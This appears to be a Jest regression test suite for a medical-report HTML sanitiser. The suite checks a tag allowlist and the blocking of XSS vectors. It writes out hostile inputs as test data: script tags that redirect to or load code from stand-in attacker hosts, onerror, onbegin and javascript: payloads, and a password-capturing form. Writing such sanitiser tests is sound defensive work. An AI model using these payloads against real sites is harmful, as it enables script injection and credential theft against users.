import { sanitizeReportSummary, ALLOWED_TAGS } from '../../src/utils/htmlSanitizer.js';

/**
 * HIGH H15 regression.
 *
 * Report summaries are lab-written HTML rendered to patients through
 * dangerouslySetInnerHTML in three places. Sanitisation was 25 lines of
 * hand-written regex while `sanitize-html` sat installed and unimported.
 *
 * The regex blocked the obvious vectors — the audit could not break it with
 * <script>, onerror or javascript: — but it could not see STRUCTURE. The cases
 * marked "regex could not handle" below are the ones a parser fixes.
 */
describe('Report summary sanitisation (HIGH H15)', () => {
  describe('the §6.4 allowlist', () => {
    it('matches CONTEXT §6.4 exactly', () => {
      expect([...ALLOWED_TAGS].sort()).toEqual(
        ['b', 'br', 'em', 'h4', 'i', 'li', 'ol', 'p', 'strong', 'u', 'ul'].sort()
      );
    });

    it('keeps every permitted tag', () => {
      const clean = sanitizeReportSummary(
        '<p>Para</p><b>b</b><i>i</i><em>em</em><strong>s</strong><u>u</u>' +
          '<ul><li>one</li></ul><ol><li>two</li></ol><h4>Heading</h4><br>'
      );

      for (const tag of ['p', 'b', 'i', 'em', 'strong', 'u', 'ul', 'ol', 'li', 'h4']) {
        expect(clean).toContain(`<${tag}>`);
      }
      expect(clean).toContain('<br />');
    });

    it('strips every attribute, including harmless ones', () => {
      const clean = sanitizeReportSummary(
        '<p class="x" id="y" data-z="1" style="color:red" title="t">Text</p>'
      );
      expect(clean).toBe('<p>Text</p>');
    });
  });

  describe('vectors the regex version already blocked (must stay blocked)', () => {
    it('removes a script tag and its contents', () => {
      const clean = sanitizeReportSummary(
        '<p>Before</p><script>window.location="https://attacker.com"</script><p>After</p>'
      );
      expect(clean).not.toContain('script');
      expect(clean).not.toContain('attacker.com');
      expect(clean).toContain('<p>Before</p>');
      expect(clean).toContain('<p>After</p>');
    });

    it('removes an img with an onerror handler', () => {
      const clean = sanitizeReportSummary('<p>Hi</p><img src=x onerror=alert(1)>');
      expect(clean).not.toContain('img');
      expect(clean).not.toContain('onerror');
    });

    it('removes a javascript: href', () => {
      const clean = sanitizeReportSummary('<a href="javascript:alert(1)">click</a>');
      expect(clean).not.toContain('javascript');
      expect(clean).not.toContain('href');
    });

    it('strips inline event handlers from permitted tags', () => {
      const clean = sanitizeReportSummary('<h4 style="color:red" onclick="alert(1)">Note</h4>');
      expect(clean).toBe('<h4>Note</h4>');
    });

    it('removes iframes and their contents', () => {
      const clean = sanitizeReportSummary('<p>A</p><iframe src="https://evil"></iframe>');
      expect(clean).not.toContain('iframe');
      expect(clean).not.toContain('evil');
    });
  });

  describe('vectors the regex version could NOT handle', () => {
    it('does not store an UNTERMINATED tag verbatim', () => {
      // The old patterns both required a closing '>', so this was persisted
      // exactly as written and left for the browser to complete.
      const clean = sanitizeReportSummary('<p>Result</p><script src=//evil.example/x.js');
      expect(clean).not.toContain('<script');
      expect(clean).not.toContain('evil.example');
    });

    it('does not leave a dangling comment opener to swallow the summary', () => {
      // '<!--' matched neither pattern, so it survived and commented out
      // everything after it when rendered.
      const clean = sanitizeReportSummary('<p>Visible</p><!-- <p>Hidden</p>');
      expect(clean).not.toContain('<!--');
      expect(clean).toContain('Visible');
    });

    it('escapes a stray angle bracket instead of leaving raw markup', () => {
      // The regex left fragments like '<scr' as raw text in the output.
      const clean = sanitizeReportSummary('<p>5 < 10 and 20 > 15</p>');
      expect(clean).toContain('&lt;');
      expect(clean).not.toMatch(/<(?!\/?p\b)/);
    });

    it('handles a mangled nested tag, leaving only escaped inert text', () => {
      const clean = sanitizeReportSummary('<scr<script>ipt>alert(1)</script>');

      // The payload survives only as ESCAPED TEXT ("ipt&gt;alert(1)"), which the
      // browser renders as characters and never executes. What matters is that
      // no executable markup remains — not that the word "alert" is absent.
      expect(clean).not.toContain('<scr');
      expect(clean).not.toContain('<script');
      // No tag at all outside the allowlist survives.
      expect(clean).not.toMatch(/<(?!\/?(?:b|i|em|strong|u|p|br|ul|ol|li|h4)\b)/);
    });

    it('strips an attribute whose value contains a closing bracket', () => {
      // '[^>]*' stopped at the first '>' inside the quoted value, leaving the
      // remainder as text.
      const clean = sanitizeReportSummary('<p title="a>b" onmouseover="alert(1)">Text</p>');
      expect(clean).not.toContain('onmouseover');
      expect(clean).not.toContain('alert');
      expect(clean).toContain('Text');
    });

    it('drops a form and its inputs', () => {
      const clean = sanitizeReportSummary(
        '<form action="https://evil"><input name="pw" type="password"></form><p>Report</p>'
      );
      expect(clean).not.toContain('form');
      expect(clean).not.toContain('input');
      expect(clean).toContain('<p>Report</p>');
    });

    it('drops svg-based payloads', () => {
      const clean = sanitizeReportSummary('<svg><animate onbegin=alert(1)></svg><p>R</p>');
      expect(clean).not.toContain('svg');
      expect(clean).not.toContain('onbegin');
      expect(clean).toContain('<p>R</p>');
    });
  });

  describe('input handling', () => {
    it('returns an empty string for non-string or empty input', () => {
      expect(sanitizeReportSummary(null)).toBe('');
      expect(sanitizeReportSummary(undefined)).toBe('');
      expect(sanitizeReportSummary('')).toBe('');
      expect(sanitizeReportSummary(42)).toBe('');
      expect(sanitizeReportSummary({})).toBe('');
    });

    it('reduces a summary of pure markup to nothing, so publish rejects it', () => {
      // reportService treats an empty result as EMPTY_REPORT_SUMMARY.
      expect(sanitizeReportSummary('<script>alert(1)</script>')).toBe('');
    });

    it('preserves clinical text and formatting intact', () => {
      const clean = sanitizeReportSummary(
        '<p>Haemoglobin is <b>14.2 g/dL</b> (normal).</p>' +
          '<h4>Doctor note</h4>' +
          '<ul><li>Thyroid within limits</li><li>Repeat in 6 months</li></ul>'
      );

      expect(clean).toContain('<b>14.2 g/dL</b>');
      expect(clean).toContain('<h4>Doctor note</h4>');
      expect(clean).toContain('<li>Repeat in 6 months</li>');
    });
  });
});
